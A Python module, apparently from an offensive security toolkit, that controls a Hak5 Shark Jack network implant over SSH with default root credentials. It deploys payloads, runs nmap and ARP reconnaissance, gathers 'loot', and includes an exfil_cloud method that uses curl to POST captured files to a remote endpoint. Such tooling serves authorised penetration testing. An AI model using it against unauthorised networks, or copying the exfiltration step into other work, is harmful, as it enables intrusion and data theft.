"""
NullSec Hak5 Toolkit - Shark Jack Module

Supports: Shark Jack, Shark Jack Cable
Connection: SSH/Network (default: 172.16.24.1)
"""

import json
import time
from pathlib import Path
from typing import Dict, List, Optional, Any

try:
    import paramiko
except ImportError:
    paramiko = None

from core.device import (
    Hak5Device, DeviceType, ConnectionType, DeviceInfo, PayloadResult
)


class SharkjackDevice(Hak5Device):
    """
    Shark Jack device interface.

    The Shark Jack is a portable network attack tool.
    Communicates via SSH when in arming mode (Ethernet).
    """

    DEVICE_TYPE = DeviceType.SHARK_JACK

    def __init__(self, config: Dict[str, Any] = None):
        config = config or {}
        self.host = config.get("host", "172.16.24.1")
        self.port = config.get("ssh_port", 22)
        self.username = config.get("username", "root")
        self.password = config.get("password", "hak5shark")
        self.ssh = None
        self._connected = False

    def connect(self) -> bool:
        """Establish SSH connection to the Shark Jack."""
        if paramiko is None:
            raise ImportError("paramiko library required: pip install paramiko")

        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            self.ssh.connect(
                self.host,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=10,
            )
            self._connected = True
            return True
        except Exception as e:
            raise ConnectionError(f"Cannot connect to Shark Jack: {e}")

    def disconnect(self) -> None:
        """Close SSH connection."""
        if self.ssh:
            self.ssh.close()
        self._connected = False

    def get_info(self) -> DeviceInfo:
        """Get Shark Jack device information."""
        self._require_connection()

        firmware = self._exec("cat /etc/shark_version 2>/dev/null || echo unknown").strip()
        mac = self._exec("cat /sys/class/net/eth0/address 2>/dev/null || echo unknown").strip()
        uptime = self._exec("uptime -p 2>/dev/null || uptime").strip()
        battery = self._get_battery_level()

        return DeviceInfo(
            name="Shark Jack",
            device_type=DeviceType.SHARK_JACK,
            firmware_version=firmware,
            serial_number=mac,
            connection_type=ConnectionType.NETWORK,
            connection_address=f"{self.host}:{self.port}",
            extra={
                "uptime": uptime,
                "battery": battery,
                "switch_position": self._get_switch(),
            },
        )

    def deploy_payload(self, payload_path: Path) -> PayloadResult:
        """Deploy a payload to the Shark Jack."""
        self._require_connection()

        try:
            sftp = self.ssh.open_sftp()
            remote_path = f"/root/payload/{payload_path.name}"

            self._exec("mkdir -p /root/payload")

            if payload_path.is_dir():
                for f in payload_path.iterdir():
                    if f.is_file():
                        sftp.put(str(f), f"/root/payload/{f.name}")
                        if f.suffix == ".sh":
                            self._exec(f"chmod +x /root/payload/{f.name}")
            else:
                sftp.put(str(payload_path), remote_path)
                if payload_path.suffix == ".sh":
                    self._exec(f"chmod +x {remote_path}")

            sftp.close()

            return PayloadResult(
                success=True,
                output=f"Deployed {payload_path.name} to Shark Jack",
                device_type=DeviceType.SHARK_JACK,
            )
        except Exception as e:
            return PayloadResult(
                success=False, error=str(e), device_type=DeviceType.SHARK_JACK,
            )

    def list_payloads(self) -> List[str]:
        """List payloads on the Shark Jack."""
        self._require_connection()
        output = self._exec("ls -1 /root/payload/ 2>/dev/null")
        return [p.strip() for p in output.splitlines() if p.strip()]

    def get_loot(self) -> List[Dict[str, Any]]:
        """Get loot from the Shark Jack."""
        self._require_connection()
        loot_items = []

        output = self._exec("find /root/loot -type f 2>/dev/null")
        for line in output.splitlines():
            line = line.strip()
            if line:
                size = self._exec(f"stat -c %s '{line}' 2>/dev/null").strip()
                loot_items.append({
                    "path": line,
                    "filename": Path(line).name,
                    "size": int(size) if size.isdigit() else 0,
                })

        return loot_items

    def backup_config(self, output_path: Path = None) -> Path:
        """Backup Shark Jack configuration."""
        self._require_connection()
        output = output_path or Path(f"sharkjack_backup_{int(time.time())}")
        output.mkdir(parents=True, exist_ok=True)

        sftp = self.ssh.open_sftp()

        # Backup payload
        try:
            for f in sftp.listdir("/root/payload/"):
                sftp.get(f"/root/payload/{f}", str(output / f))
        except Exception:
            pass

        # Backup loot
        loot_dir = output / "loot"
        loot_dir.mkdir(exist_ok=True)
        try:
            for f in sftp.listdir("/root/loot/"):
                sftp.get(f"/root/loot/{f}", str(loot_dir / f))
        except Exception:
            pass

        sftp.close()
        return output

    def restore_config(self, config_path: Path) -> bool:
        """Restore Shark Jack from backup."""
        self._require_connection()
        try:
            sftp = self.ssh.open_sftp()
            for f in config_path.iterdir():
                if f.is_file():
                    sftp.put(str(f), f"/root/payload/{f.name}")
            sftp.close()
            return True
        except Exception:
            return False

    # ── Shark Jack-specific methods ──

    def nmap_scan(self, target: str = "192.168.1.0/24", options: str = "-sn") -> str:
        """Run an nmap scan from the Shark Jack."""
        self._require_connection()
        return self._exec(f"nmap {options} {target} 2>&1")

    def netdiscover(self, interface: str = "eth0", duration: int = 30) -> str:
        """Run netdiscover for ARP reconnaissance."""
        self._require_connection()
        return self._exec(f"timeout {duration} netdiscover -i {interface} -P 2>&1")

    def lldp_listen(self, duration: int = 30) -> str:
        """Listen for LLDP packets to discover network infrastructure."""
        self._require_connection()
        return self._exec(f"timeout {duration} lldpd -d 2>&1 || timeout {duration} tcpdump -i eth0 -nn ether proto 0x88cc -c 5 2>&1")

    def get_dhcp_info(self) -> Dict[str, str]:
        """Get DHCP lease information."""
        self._require_connection()
        info = {}
        lease = self._exec("cat /tmp/dhcp.leases 2>/dev/null || cat /var/lib/dhcp/dhclient.leases 2>/dev/null")
        if lease:
            for line in lease.splitlines():
                line = line.strip()
                if "fixed-address" in line:
                    info["ip"] = line.split()[-1].rstrip(";")
                elif "subnet-mask" in line:
                    info["subnet"] = line.split()[-1].rstrip(";")
                elif "routers" in line:
                    info["gateway"] = line.split()[-1].rstrip(";")
                elif "domain-name-servers" in line:
                    info["dns"] = line.split()[-1].rstrip(";")
        return info

    def exfil_cloud(self, loot_path: str, endpoint: str) -> str:
        """Exfiltrate loot to a cloud endpoint."""
        self._require_connection()
        return self._exec(
            f"curl -s -X POST -F 'file=@{loot_path}' '{endpoint}' 2>&1"
        )

    def get_battery_status(self) -> Dict[str, Any]:
        """Get detailed battery status."""
        self._require_connection()
        return {
            "level": self._get_battery_level(),
            "charging": "CHARGING" in self._exec("cat /tmp/battery_state 2>/dev/null").upper(),
        }

    # ── Internal helpers ──

    def _require_connection(self):
        if not self._connected:
            raise ConnectionError("Not connected to Shark Jack. Call connect() first.")

    def _exec(self, command: str) -> str:
        """Execute a command via SSH."""
        _, stdout, _ = self.ssh.exec_command(command, timeout=30)
        return stdout.read().decode("utf-8", errors="replace")

    def _get_battery_level(self) -> str:
        """Get battery percentage."""
        level = self._exec("cat /tmp/battery_level 2>/dev/null || echo unknown").strip()
        return f"{level}%" if level.isdigit() else level

    def _get_switch(self) -> str:
        """Get current switch position."""
        return self._exec("cat /tmp/switch_position 2>/dev/null || echo unknown").strip()
